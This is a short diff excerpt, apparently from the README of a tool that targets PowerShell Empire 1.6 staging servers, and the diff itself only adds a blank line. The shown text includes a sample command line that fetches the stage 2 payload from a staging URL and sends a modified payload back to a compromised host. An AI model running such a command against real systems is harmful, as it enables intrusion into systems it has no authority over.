@@ -30,6 +30,7 @@ the URL for the staging server. The URL may be acquired through brute-force,
 although this functionality is currently not implemented.
 
 Here is a sample command line for targeting Powershell Empire 1.6:
+
 	./ewok.salad -u http://10.1.1.10:8080/login/process.php -c 172.16.0.5
 	# This command acquires the stage 2 payload from the URL listed, 
 	# and then delivers a modified payload that causes the compromised
